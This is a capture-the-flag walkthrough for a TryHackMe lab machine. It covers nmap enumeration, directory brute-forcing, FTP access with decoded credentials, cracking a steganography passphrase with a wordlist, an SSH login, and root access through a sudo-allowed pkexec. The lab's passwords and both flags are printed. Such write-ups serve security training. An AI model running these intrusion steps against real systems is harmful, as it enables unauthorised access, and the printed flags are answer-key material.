# Lian_Yu - THM 

## Enumeration 

### Let's begin with the nmap scan 
```
# Nmap 7.92 scan initiated Mon Nov 22 17:44:10 2021 as: nmap -sC -sV -oN nmap 10.10.12.9
Nmap scan report for 10.10.12.9
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34881/tcp   status
|   100024  1          40205/udp6  status
|   100024  1          43702/udp   status
|_  100024  1          51089/tcp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 22 17:44:49 2021 -- 1 IP address (1 host up) scanned in 39.18 seconds
                                                                                                                                                                      
```

### We watched the web server and its showing a simple page showing a simple page 
```
![img 01]()
```

### Let's start with directory bruteforcing, we find  
```
/island
```

### And here we find another web page 
```
![img 02]()
```

### And by viewing the page source we find something interesting - "vigilante" 
```
![img 03]()
```

### Let's enumerate more by bruteforcing this directory, and we found another directory

```
/2100                 (Status: 301) [Size: 238] [--> http://10.10.12.9/island/2100/]
 
```

### Here we found this page 

```
![img 04]()
```

### Here we found another hint ".ticket", it seems like an extension. So by bruteforcing more i found 
```
/green_arrow.ticket   (Status: 200) [Size: 71]

```

### Here we found a password hash 
```
![img 05]()

```
### So we tried this password with the username - "vigilante" with the password "RTy8yhBQdscX", but it failed 

### So, we tried to decode this code "RTy8yhBQdscX" by using cyberchef
```
![img 06]()

```

### Here we found a valid password i.e
```
vigilante:!#th3h00d
```

### So we tried these creds on ftp login and here we got a successfull login 
```
$ ftp 10.10.12.9                                                                                                                       
Connected to 10.10.12.9.
220 (vsFTPd 3.0.2)
Name (10.10.12.9:sig): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

### So by listing all the files in the directory, we got  
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.

```

### And also we need found another user 
```
ftp> cd ..
250 Directory successfully changed.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01 06:55 slade
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 vigilante
226 Directory send OK.
```

### So here we found some images and it seems that something is hidden to lets try steghide to extract the information from the images 
```
$ steghide --extract -sf aa.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

### So we dont have the password to open this image, So we tried using "stegcracker" to bruteforce the password for the file and here we found the password
```
$ stegcracker aa.jpg                              
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 196 passwords
Your file has been written to: aa.jpg.out
password

```
```
password
```

### We got the password here and now we got the information from the images "aa.png" using steghide and we find 2 files 
```
passwd.txt              
shado                   

```

### So by viewing the contents of the files, we find 
```
$ cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

```
$ cat shado 
M3tahuman
```

### Here we found the password, So we tried loggin to the server by using ssh
```
$ ssh slade@10.10.113.65       
The authenticity of host '10.10.113.65 (10.10.113.65)' can't be established.
ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.113.65' (ED25519) to the list of known hosts.
slade@10.10.113.65's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$

```

### BOOOOOMMMMMMMM!!!!!!!!!! , We got the initial foothold here 


### And here we got the user flag 
```
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

```

## Prev Esc 

### It's time for prev esc 

### By checking the the previages using "sudo -l" that we can run as root on the server and we find
```
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

### Here we find that we can run pkexec as root
### So by using GTFO bins we find a way to get the root access 
```
![img 07]()
```
### BOOOOOOOOOOMMMMMMMMMMMM!!!!!!!!!!!!!!!!, We got the root access on the machine 
### By using the command we got the root access 
```
# whoami
root
```

### And finally we got the root flag 
```
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE


```

# <3 By SIG WOTTS
                   
